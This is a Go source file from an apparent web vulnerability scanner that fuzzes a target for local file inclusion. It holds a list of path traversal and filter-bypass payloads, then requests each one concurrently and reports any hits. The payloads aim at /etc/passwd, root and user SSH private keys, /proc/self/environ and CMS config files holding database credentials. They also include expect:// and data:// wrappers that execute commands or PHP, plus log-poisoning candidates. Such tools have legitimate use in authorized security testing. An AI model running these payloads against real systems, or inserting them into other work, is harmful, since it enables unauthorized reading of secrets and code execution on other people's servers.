package vulns

import (
	"encoding/base64"
	"fmt"
	"io"
	"net/http"
	"regexp"
	"strings"
	"sync"

	"github.com/yupiyy/bhyakugan/internal/core"
)

// TraversalPayload defines a specific LFI payload and what to look for
type TraversalPayload struct {
	Name     string
	Payload  string
	Check    string // String to look for in response (e.g. "root:x:", "[extensions]")
	Platform string // "linux", "windows", "all"
}

var LFIPayloads = []TraversalPayload{
	// --- Linux Basic ---
	{"LFI Basic (Linux)", "../../../../../../../../etc/passwd", "root:x:", "linux"},
	{"LFI Root (Linux)", "/etc/passwd", "root:x:", "linux"},
	
	// --- Windows Basic ---
	{"LFI Basic (Windows)", "../../../../../../../../windows/win.ini", "[fonts]", "windows"},
	{"LFI Basic (Windows Alt)", "../../../../../../../../winnt/win.ini", "[fonts]", "windows"},

	// --- Encoding Bypasses ---
	{"LFI URL Encoded", "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd", "root:x:", "linux"},
	{"LFI Double URL Encoded", "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd", "root:x:", "linux"},
	{"LFI Unicode", "%u002e%u002e/%u002e%u002e/%u002e%u002e/etc/passwd", "root:x:", "linux"},
	{"LFI Overlong UTF8", "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd", "root:x:", "linux"},

	// --- Filter Bypasses ---
	{"LFI Mangled Path", "..././..././..././..././etc/passwd", "root:x:", "linux"},
	{"LFI Mangled Path 2", "....//....//....//....//etc/passwd", "root:x:", "linux"},
	{"LFI Reverse Proxy Bypass (Tomcat/Nginx)", "..;/..;/..;/..;/etc/passwd", "root:x:", "linux"},
	
	// --- Unicode Normalization Bypasses ---
	{"LFI Unicode (Two Dot Leader)", "‥/‥/‥/‥/‥/‥/‥/etc/passwd", "root:x:", "linux"}, // U+2025 -> ..
	{"LFI Unicode (Vertical Two Dot)", "︰/︰/︰/︰/︰/︰/︰/etc/passwd", "root:x:", "linux"}, // U+FE30 -> ..
	{"LFI Unicode (Fullwidth Solidus)", "..／..／..／..／..／..／..／etc／passwd", "root:x:", "linux"}, // U+FF0F -> /
	
	// --- Wrappers & Protocols ---
	// We prepend ?file= to wrappers because they are typically injected into parameters,
	// and putting them in the raw path often breaks HTTP clients/servers.
	{"LFI PHP Filter (Base64)", "?file=php://filter/convert.base64-encode/resource=index.php", "PD9", "all"}, // Base64 header for <?
	{"LFI PHP Filter (ROT13)", "?file=php://filter/read=string.rot13/resource=index.php", "<?cuc", "all"}, // rot13(<?php) = <?cuc
	{"LFI Data Wrapper", "?file=data://text/plain;base64,PD9waHAgZWNobyAiQmh5YWt1Z2FuUkNFIjsgPz4=", "BhyakuganRCE", "all"}, // <?php echo "BhyakuganRCE"; ?>
	{"LFI Expect Wrapper", "?file=expect://id", "uid=", "linux"},
	
	// --- RCE via Log Poisoning Candidates ---
	{"LFI Apache Access Log", "/var/log/apache2/access.log", "Mozilla/5.0", "linux"}, // Just checking if we can read log first
	{"LFI Apache Error Log", "/var/log/apache2/error.log", "PHP Fatal error", "linux"},
	{"LFI Nginx Access Log", "/var/log/nginx/access.log", "Mozilla/5.0", "linux"},
	{"LFI SSH Auth Log", "/var/log/auth.log", "sshd", "linux"},

	// --- Common Web App Files (Source Code Disclosure via Wrapper) ---
	// We use php://filter/convert.base64-encode to read PHP files without executing them
	{"LFI WP Config", "?file=php://filter/convert.base64-encode/resource=wp-config.php", "PD9w", "all"}, // <?php
	{"LFI Joomla Config", "?file=php://filter/convert.base64-encode/resource=configuration.php", "PD9w", "all"},
	{"LFI Drupal Settings", "?file=php://filter/convert.base64-encode/resource=sites/default/settings.php", "PD9w", "all"},
	{"LFI Magento Config", "?file=php://filter/convert.base64-encode/resource=app/etc/local.xml", "PD94", "all"}, // <?xml
	
	// --- Static Files ---
	{"LFI Robots", "robots.txt", "User-agent:", "all"},
	{"LFI Win.ini", "../../../../../../../windows/win.ini", "[fonts]", "windows"}, // Redundant but explicit
	{"LFI Boot.ini (Windows)", "../../../../../../../boot.ini", "[boot loader]", "windows"},
	
	// --- Linux System Files (PAAT Selection) ---
	{"LFI Etc Hosts", "/etc/hosts", "127.0.0.1", "linux"},
	{"LFI Proc Net TCP", "/proc/net/tcp", "sl  local_address", "linux"},
	{"LFI Proc Sched Debug", "/proc/sched_debug", "runnable tasks:", "linux"},
	{"LFI SSH Key (User)", "../../../../../../../home/user/.ssh/id_rsa", "OPENSSH PRIVATE KEY", "linux"}, // Common guess
	{"LFI SSH Key (Root)", "../../../../../../../root/.ssh/id_rsa", "OPENSSH PRIVATE KEY", "linux"},

	// --- Server Configs ---
	{"LFI Apache Config", "/etc/httpd/conf/httpd.conf", "ServerRoot", "linux"},
	{"LFI Nginx Config", "/etc/nginx/nginx.conf", "worker_processes", "linux"},
	
	// --- Proc Files ---
	{"LFI Proc Self Environ", "/proc/self/environ", "HTTP_USER_AGENT", "linux"},
	{"LFI Proc Version", "/proc/version", "Linux version", "linux"},
}

// ScanLFI runs the advanced directory traversal fuzzing
func ScanLFI(baseURL string, client *http.Client, onFound func(core.Finding)) {
	if baseURL[len(baseURL)-1] != '/' {
		baseURL += "/"
	}

	var wg sync.WaitGroup
	semaphore := make(chan struct{}, 5) 
	
	// Collect results
	var results []string
	var highestSeverity string = "Medium"
	var mu sync.Mutex

	for _, p := range LFIPayloads {
		wg.Add(1)
		go func(payload TraversalPayload) {
			defer wg.Done()
			semaphore <- struct{}{}
			defer func() { <-semaphore }()

			target := baseURL + payload.Payload
			
			resp, err := client.Get(target)
			if err != nil {
				return
			}
			defer resp.Body.Close()

			body, err := io.ReadAll(resp.Body)
			if err != nil {
				return
			}
			bodyStr := string(body)

			isTraversal := strings.Contains(payload.Payload, "..") || strings.Contains(payload.Payload, "://")
			
			if strings.Contains(bodyStr, payload.Check) {
				// Base64 Logic
				if strings.Contains(payload.Payload, "base64-encode") {
					// 1. Extract Base64 Candidate
					re := regexp.MustCompile(`[a-zA-Z0-9+/=]{20,}`)
					matches := re.FindAllString(bodyStr, -1)
					
					verified := false
					decodedSnippet := ""

					for _, m := range matches {
						if strings.Contains(m, payload.Check) {
							// Try decode
							decoded, err := base64.StdEncoding.DecodeString(m)
							if err == nil {
								decStr := string(decoded)
								// 2. Validate Content
								if strings.Contains(decStr, "<?php") || 
								   strings.Contains(decStr, "$db") || 
								   strings.Contains(decStr, "define(") || 
								   strings.Contains(decStr, "class ") ||
								   strings.Contains(decStr, "return array") {
									verified = true
									decodedSnippet = decStr
									if len(decodedSnippet) > 50 { decodedSnippet = decodedSnippet[:50] + "..." }
									break
								}
							}
						}
					}

					mu.Lock()
					if verified {
						results = append(results, fmt.Sprintf("Source Disclosure (%s) - Decoded: %s", payload.Name, decodedSnippet))
						highestSeverity = "Critical"
					} else {
						// Found PD9 header but validation failed or content is junk
						results = append(results, fmt.Sprintf("Potential LFI (%s) - Base64 header found, content unverified", payload.Name))
					}
					mu.Unlock()
					return 
				}

				// Standard LFI Logic
				if isTraversal || strings.HasPrefix(payload.Payload, "/etc/") {
					mu.Lock()
					results = append(results, fmt.Sprintf("System File Read (%s) - Found: %s", payload.Name, payload.Check))
					highestSeverity = "Critical"
					mu.Unlock()
				}
			}
		}(p)
	}
	wg.Wait()

	if len(results) > 0 {
		fmt.Printf("[!] LFI CONFIRMED at %s (Impacts: %d)\n", baseURL, len(results))
		onFound(core.Finding{
			Type:     "Local File Inclusion (LFI)",
			Target:   baseURL, // Reporting the Endpoint, not the specific payload URL
			Detail:   fmt.Sprintf("LFI vulnerability detected. Impacted resources:\n- %s", strings.Join(results, "\n- ")),
			Severity: highestSeverity,
		})
	}
}
